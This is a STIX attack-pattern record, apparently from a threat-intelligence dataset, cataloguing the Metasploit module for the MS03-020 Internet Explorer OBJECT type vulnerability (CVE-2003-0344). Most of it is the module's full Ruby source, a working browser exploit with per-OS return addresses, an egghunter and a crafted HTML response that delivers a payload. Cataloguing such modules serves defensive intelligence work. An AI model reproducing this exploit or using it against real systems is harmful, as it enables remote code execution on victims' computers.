{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3955b8c-8de0-47b7-9793-cecda5bf9946",
    "created": "2024-08-14T16:42:59.937841Z",
    "modified": "2024-08-14T16:42:59.937845Z",
    "name": "MS03-020 Microsoft Internet Explorer Object Type",
    "description": " This module exploits a vulnerability in Internet Explorer's handling of the OBJECT type attribute. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms03_020_ie_objecttype.rb",
            "external_id": "ms03_020_ie_objecttype.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0344"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS03-020 Microsoft Internet Explorer Object Type',\n      'Description'    => %q{\n          This module exploits a vulnerability in Internet Explorer's\n        handling of the OBJECT type attribute.\n      },\n      'Author'         => 'skape',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0344' ],\n          [ 'OSVDB', '2967'    ],\n          [ 'BID', '7806'      ],\n          [ 'MSB', 'MS03-020'  ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'MaxNops'  => 0,\n          'BadChars' => \"\\x8b\\xe2\", # Prevent UTF-8-ification\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          # Target 0: Automatic\n          [\n            'Windows NT/XP/2003 Automatic',\n            {\n              'Platform' => 'win',\n              'Rets'     =>\n                [\n                  0x777e85ab, # Windows NT: samlib jmp esp\n                  0x71ab1d54, # Windows XP: ws2_32 push esp/ret SP0/1\n                  0x77d1f92f, # Windows 2003: user32 jmp esp SP0/1\n                ],\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-06-04'))\n  end\n\n  def on_request_uri(cli, request)\n    clean = 0x7ffdec50\n    ret   = nil\n\n    # Figure out which return address to use based on the user-agent\n    case request['User-Agent']\n      when /Windows NT 5.2/\n        ret = target['Rets'][2]\n      when /Windows NT 5.1/\n        ret = target['Rets'][1]\n      when /Windows NT/\n        ret = target['Rets'][0]\n      else\n        print_status(\"Sending 404 to user agent: #{request['User-Agent']}\")\n        cli.send_response(create_response(404, 'File not found'))\n        return\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Pack the values\n    ret    = [ ret   ].pack('V')\n    clean  = [ clean ].pack('V')\n\n    #checksum is disabled because it is 54 bytes big, and we have only 40 bytes of room\n    #to fit the egghunter. (See bug #4552)\n    hunter = generate_egghunter(p.encoded, payload_badchars, { :checksum => false })\n    egg    = hunter[1]\n\n    # Now, build out the HTTP response payload\n    content =\n      \"<html>\" + egg + \"\\n\" +\n      \"<object type=\\\"////////////////////////////////////////////////////////////////\" +\n      rand_text_alphanumeric(8) + ret + clean +\n      make_nops(8) + hunter[0] + \"\\\">\" +\n      \"</object>\" +\n      \"</html>\"\n\n    print_status(\"Sending exploit HTML\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-06-04",
    "x_mitre_platforms": [
        "win'"
    ]
}